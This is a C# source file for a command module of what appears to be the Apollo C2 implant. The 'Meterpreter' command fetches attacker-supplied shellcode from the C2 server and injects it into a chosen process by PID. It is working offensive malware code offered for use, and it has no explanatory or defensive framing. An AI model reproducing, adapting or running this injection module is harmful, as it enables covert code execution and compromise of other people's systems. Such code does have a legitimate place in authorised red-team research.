#define COMMAND_NAME_UPPER

#if DEBUG
#undef METERPRETER
#define METERPRETER
#endif

#if METERPRETER

using Apollo.Jobs;
using Apollo.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Apollo.CommandModules
{
    public class Meterpreter
    {
        /// <summary>
        /// Execute arbitrary shellcode into the local process.
        /// </summary>
        /// <param name="job">Job associated with this task.</param>
        /// <param name="agent">Agent associated with this task.</param>
        public static void Execute(Job job, Agent agent)
        {
            Task task = job.Task;
            int pid;
            byte[] sc;
            string fileId;

            JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);
            pid = json.Value<int>("pid");
            fileId = json.Value<string>("shellcode");

            if (pid < 0)
            {
                job.SetError("Invalid PID given.");
                return;
            }

            try
            {
                var temp = System.Diagnostics.Process.GetProcessById(pid);
            } catch (Exception ex)
            {
                job.SetError($"Failed to get process with pid {pid}. Reason: {ex.Message}");
                return;
            }

            if (string.IsNullOrEmpty(fileId))
            {
                job.SetError("No shellcode file could be determined.");
                return;
            }

            sc = agent.Profile.GetFile(task.id, fileId, agent.Profile.ChunkSize);
            if (sc == null || sc.Length == 0)
            {
                job.SetError("Error fetching file or file was empty.");
                return;
            }

            Console.WriteLine(HexDump(sc));

            var injectionType = Injection.InjectionTechnique.GetInjectionTechnique();
            var injectionHandler = (Injection.InjectionTechnique)Activator.CreateInstance(injectionType, new object[] { sc, (uint)pid });
            if (injectionHandler.Inject())
            {
                job.SetComplete($"Successfully injected shellcode into {pid}");
            } else
            {
                job.SetError($"Failed to inject shellcode into {pid}. Error code: {Marshal.GetLastWin32Error()}");
            }
        }

        public static string HexDump(byte[] bytes, int bytesPerLine = 16)
        {
            if (bytes == null) return "<null>";
            int bytesLength = bytes.Length;

            char[] HexChars = "0123456789ABCDEF".ToCharArray();

            int firstHexColumn =
                  8                   // 8 characters for the address
                + 3;                  // 3 spaces

            int firstCharColumn = firstHexColumn
                + bytesPerLine * 3       // - 2 digit for the hexadecimal value and 1 space
                + (bytesPerLine - 1) / 8 // - 1 extra space every 8 characters from the 9th
                + 2;                  // 2 spaces 

            int lineLength = firstCharColumn
                + bytesPerLine           // - characters to show the ascii value
                + Environment.NewLine.Length; // Carriage return and line feed (should normally be 2)

            char[] line = (new String(' ', lineLength - Environment.NewLine.Length) + Environment.NewLine).ToCharArray();
            int expectedLines = (bytesLength + bytesPerLine - 1) / bytesPerLine;
            StringBuilder result = new StringBuilder(expectedLines * lineLength);

            for (int i = 0; i < bytesLength; i += bytesPerLine)
            {
                line[0] = HexChars[(i >> 28) & 0xF];
                line[1] = HexChars[(i >> 24) & 0xF];
                line[2] = HexChars[(i >> 20) & 0xF];
                line[3] = HexChars[(i >> 16) & 0xF];
                line[4] = HexChars[(i >> 12) & 0xF];
                line[5] = HexChars[(i >> 8) & 0xF];
                line[6] = HexChars[(i >> 4) & 0xF];
                line[7] = HexChars[(i >> 0) & 0xF];

                int hexColumn = firstHexColumn;
                int charColumn = firstCharColumn;

                for (int j = 0; j < bytesPerLine; j++)
                {
                    if (j > 0 && (j & 7) == 0) hexColumn++;
                    if (i + j >= bytesLength)
                    {
                        line[hexColumn] = ' ';
                        line[hexColumn + 1] = ' ';
                        line[charColumn] = ' ';
                    }
                    else
                    {
                        byte b = bytes[i + j];
                        line[hexColumn] = HexChars[(b >> 4) & 0xF];
                        line[hexColumn + 1] = HexChars[b & 0xF];
                        line[charColumn] = (b < 32 ? '·' : (char)b);
                    }
                    hexColumn += 3;
                    charColumn++;
                }
                result.Append(line);
            }
            return result.ToString();
        }

    }
}
#endif